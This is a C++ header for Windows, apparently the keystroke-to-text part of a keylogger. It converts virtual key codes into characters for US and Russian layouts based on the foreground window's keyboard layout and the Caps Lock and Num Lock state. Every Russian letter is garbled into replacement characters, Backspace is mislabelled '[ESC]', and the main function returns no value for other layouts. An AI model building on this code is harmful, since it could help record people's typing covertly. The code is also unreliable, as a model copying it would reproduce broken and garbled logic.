#ifndef KEYS
#define KEYS

#include <windows.h>
#include <string>
#include <map>
#include <fstream>

class Keys {
public:

	static inline BOOL bShift = FALSE;
	static inline BOOL bCaps = FALSE;
	static inline BOOL bNumLock = FALSE;
	static inline WORD idLang = 0;

public:
	static std::wstring CodeToStringWithUsa(int Code) {
		switch (Code) {
			case 0x8: return L"[ESC]";
			case 0xd: return L"\n";
			case 0x20: return L" "; 
			//letters
			case 0x41: return bCaps ? (bShift ? L"a" : L"A") : (bShift ? L"A" : L"a");
			case 0x42: return bCaps ? (bShift ? L"b" : L"B") : (bShift ? L"B" : L"b");
			case 0x43: return bCaps ? (bShift ? L"c" : L"C") : (bShift ? L"C" : L"c");
			case 0x44: return bCaps ? (bShift ? L"d" : L"D") : (bShift ? L"D" : L"d");
			case 0x45: return bCaps ? (bShift ? L"e" : L"E") : (bShift ? L"E" : L"e");
			case 0x46: return bCaps ? (bShift ? L"f" : L"F") : (bShift ? L"F" : L"f");
			case 0x47: return bCaps ? (bShift ? L"g" : L"G") : (bShift ? L"G" : L"g");
			case 0x48: return bCaps ? (bShift ? L"h" : L"H") : (bShift ? L"H" : L"h");
			case 0x49: return bCaps ? (bShift ? L"i" : L"I") : (bShift ? L"I" : L"i");
			case 0x4a: return bCaps ? (bShift ? L"j" : L"J") : (bShift ? L"J" : L"j");
			case 0x4b: return bCaps ? (bShift ? L"k" : L"K") : (bShift ? L"K" : L"k");
			case 0x4c: return bCaps ? (bShift ? L"l" : L"L") : (bShift ? L"L" : L"l");
			case 0x4d: return bCaps ? (bShift ? L"m" : L"M") : (bShift ? L"M" : L"m");
			case 0x4e: return bCaps ? (bShift ? L"n" : L"N") : (bShift ? L"N" : L"n");
			case 0x4f: return bCaps ? (bShift ? L"o" : L"O") : (bShift ? L"O" : L"o");
			case 0x50: return bCaps ? (bShift ? L"p" : L"P") : (bShift ? L"P" : L"p");
			case 0x51: return bCaps ? (bShift ? L"q" : L"Q") : (bShift ? L"Q" : L"q");
			case 0x52: return bCaps ? (bShift ? L"r" : L"R") : (bShift ? L"R" : L"r");
			case 0x53: return bCaps ? (bShift ? L"s" : L"S") : (bShift ? L"S" : L"s");
			case 0x54: return bCaps ? (bShift ? L"t" : L"T") : (bShift ? L"T" : L"t");
			case 0x55: return bCaps ? (bShift ? L"u" : L"U") : (bShift ? L"U" : L"u");
			case 0x56: return bCaps ? (bShift ? L"v" : L"V") : (bShift ? L"V" : L"v");
			case 0x57: return bCaps ? (bShift ? L"w" : L"W") : (bShift ? L"W" : L"w");
			case 0x58: return bCaps ? (bShift ? L"x" : L"X") : (bShift ? L"X" : L"x");
			case 0x59: return bCaps ? (bShift ? L"y" : L"Y") : (bShift ? L"Y" : L"y");
			case 0x5a: return bCaps ? (bShift ? L"z" : L"Z") : (bShift ? L"Z" : L"z");
			//numbers
			case 0x30: return bShift ? L")" : L"0";
			case 0x31: return bShift ? L"!" : L"1";
			case 0x32: return bShift ? L"@" : L"2";
			case 0x33: return bShift ? L"#" : L"3";
			case 0x34: return bShift ? L"$" : L"4";
			case 0x35: return bShift ? L"%" : L"5";
			case 0x36: return bShift ? L"^" : L"6";
			case 0x37: return bShift ? L"&" : L"7";
			case 0x38: return bShift ? L"*" : L"8";
			case 0x39: return bShift ? L"(" : L"9";

			//NUMLOCK keys
			case 0x60: return (bNumLock || bShift) ? L"" : L"0";
			case 0x61: return (bNumLock || bShift) ? L"" : L"1";
			case 0x62: return (bNumLock || bShift) ? L"" : L"2";
			case 0x63: return (bNumLock || bShift) ? L"" : L"3";
			case 0x64: return (bNumLock || bShift) ? L"" : L"4";
			case 0x65: return (bNumLock || bShift) ? L"" : L"5";
			case 0x66: return (bNumLock || bShift) ? L"" : L"6";
			case 0x67: return (bNumLock || bShift) ? L"" : L"7";
			case 0x68: return (bNumLock || bShift) ? L"" : L"8";
			case 0x69: return (bNumLock || bShift) ? L"" : L"9";
			case 0x6e: return (bNumLock || bShift) ? L"" : L".";

			//other keys
			case 0xbd: return bShift ? L"_" : L"-";
			case 0xbb: return bShift ? L"+" : L"=";
			case 0xdb: return bShift ? L"{" : L"[";
			case 0xdd: return bShift ? L"}" : L"]";
			case 0xdc: return bShift ? L"|" : L"\\";
			case 0xc0: return bShift ? L"~" : L"`";
			case 0xba: return bShift ? L":" : L";";
			case 0xde: return bShift ? L"\"" : L"'";
			case 0xbc: return bShift ? L"<" : L",";
			case 0xbe: return bShift ? L">" : L".";
			case 0xbf: return bShift ? L"?" : L"/";
			case 0x6f: return L"/";
			case 0x6a: return L"*";
			case 0x6d: return L"-";
			case 0x6b: return L"+";
		}
		return L"";
	}
	
	static std::wstring CodeToStringWithRu(int Code) {
		switch (Code) {
			case 0x8: return L"[ESC]";
			case 0xd: return L"\n";
			case 0x20: return L" ";
		//letters
			case 0x41: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x42: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x43: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x44: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x45: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x46: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x47: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x48: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x49: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x4a: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x4b: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x4c: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x4d: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x4e: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x4f: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x50: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x51: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x52: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x53: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x54: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x55: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x56: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x57: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x58: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x59: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0x5a: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0xdb: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0xdd: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0xc0: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0xba: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0xde: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0xbc: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
			case 0xbe: return bCaps ? (bShift ? L"�" : L"�") : (bShift ? L"�" : L"�");
		//numbers
			case 0x30: return bShift ? L")" : L"0";
			case 0x31: return bShift ? L"!" : L"1";
			case 0x32: return bShift ? L"\"" : L"2";
			case 0x33: return bShift ? L"�" : L"3";
			case 0x34: return bShift ? L";" : L"4";
			case 0x35: return bShift ? L"%" : L"5";
			case 0x36: return bShift ? L":" : L"6";
			case 0x37: return bShift ? L"?" : L"7";
			case 0x38: return bShift ? L"*" : L"8";
			case 0x39: return bShift ? L"(" : L"9";

		//NUMLOCK keys
			case 0x60: return (bNumLock || bShift) ? L"" : L"0";
			case 0x61: return (bNumLock || bShift) ? L"" : L"1";
			case 0x62: return (bNumLock || bShift) ? L"" : L"2";
			case 0x63: return (bNumLock || bShift) ? L"" : L"3";
			case 0x64: return (bNumLock || bShift) ? L"" : L"4";
			case 0x65: return (bNumLock || bShift) ? L"" : L"5";
			case 0x66: return (bNumLock || bShift) ? L"" : L"6";
			case 0x67: return (bNumLock || bShift) ? L"" : L"7";
			case 0x68: return (bNumLock || bShift) ? L"" : L"8";
			case 0x69: return (bNumLock || bShift) ? L"" : L"9";
			case 0x6e: return (bNumLock || bShift) ? L"" : L",";

		//other keys
			case 0xbd: return bShift ? L"_" : L"-";
			case 0xbb: return bShift ? L"+" : L"=";
			case 0xdc: return bShift ? L"/" : L"\\";
			case 0xbf: return bShift ? L"," : L".";
			case 0x6f: return L"/";
			case 0x6a: return L"*";
			case 0x6d: return L"-";
			case 0x6b: return L"+";
		}
		return L"";
	}

	static std::wstring CodeToString(int Code) {
		HKL HklLang = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
		idLang = LOWORD(HklLang);

		if (GetKeyState(VK_CAPITAL) > 0) {
			bCaps = TRUE;
		}
		else {
			bCaps = FALSE;
		}

		if (GetKeyState(0x90) > 0) {
			bNumLock = FALSE;
		}
		else {
			bNumLock = TRUE;
		}

		if (idLang == 1033) {
			return CodeToStringWithUsa(Code);
		}
		if (idLang == 1049) {
			return CodeToStringWithRu(Code);
		}
	}
};

#endif